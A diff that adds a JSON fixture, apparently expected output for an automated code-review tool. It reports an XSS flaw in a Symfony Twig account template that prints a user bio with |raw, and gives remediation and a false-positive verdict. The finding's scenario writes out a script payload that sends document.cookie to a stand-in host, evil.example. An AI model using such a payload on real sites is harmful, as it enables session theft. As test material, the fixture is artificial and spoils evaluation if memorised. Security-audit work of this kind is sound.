@@ -1,0 +1,4 @@
+{
+  "templates/account/show.html.twig": "{\"findings\": [{\"line\": 8, \"end_line\": 8, \"severity\": \"high\", \"category\": \"xss\", \"title\": \"Unescaped bio rendered with |raw\", \"scenario\": \"A customer saves <script>fetch('//evil.example/?c='+document.cookie)</script> as their bio: the template prints it without escaping, so the script runs in the browser of every advisor who opens the account.\", \"remediation\": \"Remove |raw, or sanitize the HTML with the Symfony HtmlSanitizer before storing or printing it.\", \"confidence\": 0.9, \"suggestion\": \"    <div class=\\\"bio\\\">{{ account.bio }}</div>\"}]}",
+  "__false_positive__": "{\"verdicts\": [{\"id\": 0, \"keep\": true, \"reason\": \"The bio is user-provided and printed raw.\"}]}"
+}
